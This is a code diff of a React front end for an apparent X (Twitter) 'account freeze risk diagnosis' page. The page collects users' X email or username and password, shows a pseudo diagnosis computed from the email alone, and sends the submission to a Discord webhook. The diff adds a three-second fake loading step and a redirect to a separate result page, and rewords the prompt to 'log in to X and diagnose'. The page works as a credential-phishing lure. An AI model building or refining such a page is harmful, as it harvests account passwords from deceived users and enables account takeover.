@@ -3,17 +3,17 @@
  * Design: Frost Clinic
  * - 氷・雪山の世界観
  * - ログインフォーム（メール＋パスワード）で診断開始
- * - 結果：半円ゲージ＋4カテゴリ詳細カード
+ * - 結果：別ページで表示
  * - Discord Webhook連携
  * - Twitter/Xシェア機能
  */
 
-import { useState, useRef } from "react";
-import { Eye, EyeOff, Lock, Mail, AlertTriangle, CheckCircle, Info, Shield, Share2 } from "lucide-react";
+import { useState } from "react";
+import { useLocation } from "wouter";
+import { Eye, EyeOff, Lock, Mail, AlertTriangle, Info } from "lucide-react";
 import Snowfall from "@/components/Snowfall";
 import MountainBackground from "@/components/MountainBackground";
-import RiskGauge from "@/components/RiskGauge";
-import { diagnose, type DiagnosisResult } from "@/lib/diagnose";
+import { diagnose } from "@/lib/diagnose";
 import { trpc } from "@/lib/trpc";
 import { toast } from "sonner";
 
@@ -43,11 +43,11 @@ function LoginForm({ onDiagnose }: { onDiagnose: (email: string, password: strin
     }
     setErrors({});
     setLoading(true);
-    // 疑似的な診断処理（1.5秒後に結果表示）
+    // 3秒のローディング処理
     setTimeout(() => {
       setLoading(false);
       onDiagnose(email, password);
-    }, 1800);
+    }, 3000);
   };
 
   return (
@@ -55,7 +55,7 @@ function LoginForm({ onDiagnose }: { onDiagnose: (email: string, password: strin
       {/* メールアドレス */}
       <div>
         <label className="block text-sm font-medium text-slate-600 mb-1.5">
-          ユーザー名まはたメールアドレス
+          ユーザー名またはメールアドレス
         </label>
         <div className="relative">
           <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
@@ -115,7 +115,7 @@ function LoginForm({ onDiagnose }: { onDiagnose: (email: string, password: strin
       <div className="flex items-start gap-2 p-3 rounded-xl bg-blue-50/80 border border-blue-100">
         <Info className="w-4 h-4 text-blue-400 mt-0.5 shrink-0" />
         <p className="text-xs text-blue-600 leading-relaxed">
-          結果は異なる場合がございます
+          結果表示に時間がかかる恐れがあります
         </p>
       </div>
 
@@ -149,64 +149,9 @@ function LoginForm({ onDiagnose }: { onDiagnose: (email: string, password: strin
   );
 }
 
-// ===== 詳細カード =====
-function DetailCard({
-  detail,
-  delay,
-}: {
-  detail: DiagnosisResult["details"][0];
-  delay: number;
-}) {
-  const statusConfig = {
-    safe: { color: "#22c55e", bg: "bg-green-50", border: "border-green-100", icon: CheckCircle },
-    warning: { color: "#f59e0b", bg: "bg-amber-50", border: "border-amber-100", icon: AlertTriangle },
-    danger: { color: "#ef4444", bg: "bg-red-50", border: "border-red-100", icon: Shield },
-  };
-  const cfg = statusConfig[detail.status];
-  const Icon = cfg.icon;
-  const pct = (detail.score / detail.maxScore) * 100;
-
-  return (
-    <div
-      className={`glass-card rounded-2xl p-4 border fade-in-up`}
-      style={{ animationDelay: `${delay}s`, opacity: 0 }}
-    >
-      <div className="flex items-start justify-between mb-3">
-        <div className="flex items-center gap-2">
-          <span className="text-xl">{detail.icon}</span>
-          <span className="font-bold text-slate-700 text-sm">{detail.category}</span>
-        </div>
-        <Icon className="w-4 h-4" style={{ color: cfg.color }} />
-      </div>
-
-      {/* プログレスバー */}
-      <div className="h-1.5 bg-slate-100 rounded-full overflow-hidden mb-2">
-        <div
-          className="h-full rounded-full transition-all duration-1000"
-          style={{
-            width: `${pct}%`,
-            backgroundColor: cfg.color,
-            boxShadow: `0 0 6px ${cfg.color}60`,
-          }}
-        />
-      </div>
-
-      <div className="flex items-center justify-between">
-        <p className="text-xs text-slate-500">{detail.description}</p>
-        <span className="text-xs font-bold ml-2 shrink-0" style={{ color: cfg.color }}>
-          {detail.score}/{detail.maxScore}
-        </span>
-      </div>
-    </div>
-  );
-}
-
 // ===== メインページ =====
 export default function Home() {
-  const [result, setResult] = useState<DiagnosisResult | null>(null);
-  const [diagnosedEmail, setDiagnosedEmail] = useState("");
-  const [diagnosedPassword, setDiagnosedPassword] = useState("");
-  const resultRef = useRef<HTMLDivElement>(null);
+  const [, navigate] = useLocation();
 
   // Discord Webhook送信用のミューテーション
   const sendToDiscord = trpc.diagnosis.sendToDiscord.useMutation({
@@ -222,9 +167,10 @@ export default function Home() {
 
   const handleDiagnose = async (email: string, password: string) => {
     const res = diagnose(email);
-    setDiagnosedEmail(email);
-    setDiagnosedPassword(password);
-    setResult(res);
+
+    // ローカルストレージに診断結果を保存
+    localStorage.setItem("diagnosisResult", JSON.stringify(res));
+    localStorage.setItem("diagnosisEmail", email);
 
     // Discord Webhookに送信
     try {
@@ -239,33 +185,8 @@ export default function Home() {
       console.error("Discord送信エラー:", err);
     }
 
-    setTimeout(() => {
-      resultRef.current?.scrollIntoView({ behavior: "smooth", block: "start" });
-    }, 100);
-  };
-
-  const handleReset = () => {
-    setResult(null);
-    setDiagnosedEmail("");
-    setDiagnosedPassword("");
-    window.scrollTo({ top: 0, behavior: "smooth" });
-  };
-
-  const handleShareToTwitter = () => {
-    if (!result) return;
-
-    const riskText = result.score > 70 ? "【警告】" : result.score > 40 ? "【注意】" : "【安全】";
-    const tweetText = `${riskText} 凍結リスク診断で我がアカウントの凍結リスクを診断しました。
-
-🧊 リスクスコア: ${result.score}%
-📊 アカウント年齢: ${result.accountAge}
-💬 ツイート数: ${result.tweetCount.toLocaleString()}
-🚫 シャドーバン: ${result.shadowbanRisk}
-
-貴方も診断してみて、凍結リスクを事前に把握しよう！`;
-
-    const twitterUrl = `https://twitter.com/intent/tweet?text=${encodeURIComponent(tweetText)}`;
-    window.open(twitterUrl, "_blank", "width=550,height=420");
+    // 結果ページにナビゲート
+    navigate("/result");
   };
 
   return (
@@ -291,7 +212,7 @@ export default function Home() {
               alt="氷のアイコン"
               className="w-7 h-7 object-contain"
             />
-            <span className="font-bold text-slate-700 text-sm tracking-wide">凍結リスク診断</span>
+            <span className="font-bold text-slate-700 text-sm tracking-wide">診断</span>
           </div>
         </header>
 
@@ -313,7 +234,7 @@ export default function Home() {
             凍結リスク診断
           </h1>
           <p className="text-slate-500 text-sm sm:text-base text-center mb-8">
-            Xアカウントの凍結されやすさをAIが判定
+            Xにログインして診断してみよう
           </p>
 
           {/* ログインフォームカード */}
@@ -349,91 +270,20 @@ export default function Home() {
             </div>
           </div>
         </section>
-
-        {/* 診断結果セクション */}
-        {result && (
-          <section
-            ref={resultRef}
-            className="px-4 pb-32 max-w-2xl mx-auto"
-          >
-            {/* 結果ヘッダー */}
-            <div className="glass-card rounded-2xl p-6 mb-4 fade-in-up text-center">
-              <p className="text-xs text-slate-400 mb-1">診断アカウント</p>
-              <p className="text-sm font-bold text-slate-600 mb-4 truncate">{diagnosedEmail}</p>
-
-              {/* リスクゲージ */}
-              <RiskGauge score={result.score} animated />
-
-              {/* アカウント統計 */}
-              <div className="grid grid-cols-3 gap-3 mt-6 pt-5 border-t border-slate-100">
-                <div className="text-center">
-                  <p className="text-xs text-slate-400 mb-1">アカウント年齢</p>
-                  <p className="font-bold text-slate-700 text-sm">{result.accountAge}</p>
-                </div>
-                <div className="text-center border-x border-slate-100">
-                  <p className="text-xs text-slate-400 mb-1">ツイート数</p>
-                  <p className="font-bold text-slate-700 text-sm">{result.tweetCount.toLocaleString()}</p>
-                </div>
-                <div className="text-center">
-                  <p className="text-xs text-slate-400 mb-1">シャドーバン</p>
-                  <p
-                    className="font-bold text-sm"
-                    style={{
-                      color:
-                        result.shadowbanRisk === "なし" ? "#22c55e"
-                        : result.shadowbanRisk === "低" ? "#84cc16"
-                        : result.shadowbanRisk === "中" ? "#f59e0b"
-                        : "#ef4444",
-                    }}
-                  >
-                    {result.shadowbanRisk}
-                  </p>
-                </div>
-              </div>
-            </div>
-
-            {/* 詳細分析 */}
-            <h3 className="text-sm font-bold text-slate-600 mb-3 px-1">詳細分析</h3>
-            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-6">
-              {result.details.map((detail, i) => (
-                <DetailCard key={detail.category} detail={detail} delay={0.1 + i * 0.1} />
-              ))}
-            </div>
-
-            {/* ボタングループ */}
-            <div className="flex gap-3">
-              {/* Twitterシェアボタン */}
-              <button
-                onClick={() => handleShareToTwitter()}
-                className="flex-1 py-3 rounded-xl bg-gradient-to-r from-blue-400 to-cyan-400 text-white font-bold text-sm hover:shadow-lg transition-all flex items-center justify-center gap-2"
-              >
-                <Share2 className="w-4 h-4" />
-                Xにシェア
-              </button>
-              {/* もう一度診断ボタン */}
-              <button
-                onClick={handleReset}
-                className="flex-1 py-3 rounded-xl border-2 border-blue-200 text-blue-600 font-bold text-sm hover:bg-blue-50 transition-colors"
-              >
-                別のアカウントを診断する
-              </button>
-            </div>
-          </section>
-        )}
-
-        {/* フッター */}
-        <footer className="border-t border-slate-200/50 bg-white/50 backdrop-blur-sm py-6 mt-12 relative" style={{ zIndex: 2 }}>
-          <div className="max-w-2xl mx-auto px-4 flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-slate-500">
-            <p>&copy; 2026 凍結リスク診断. All rights reserved.</p>
-            <a
-              href="/privacy"
-              className="text-blue-600 hover:text-blue-700 font-medium transition-colors"
-            >
-              プライバシーポリシー
-            </a>
-          </div>
-        </footer>
       </div>
+
+      {/* フッター */}
+      <footer className="border-t border-slate-200/50 bg-white/50 backdrop-blur-sm py-6 mt-12 relative" style={{ zIndex: 2 }}>
+        <div className="max-w-2xl mx-auto px-4 flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-slate-500">
+          <p>&copy; 2026 凍結リスク診断. All rights reserved.</p>
+          <a
+            href="/privacy"
+            className="text-blue-600 hover:text-blue-700 font-medium transition-colors"
+          >
+            プライバシーポリシー
+          </a>
+        </div>
+      </footer>
     </div>
   );
 }
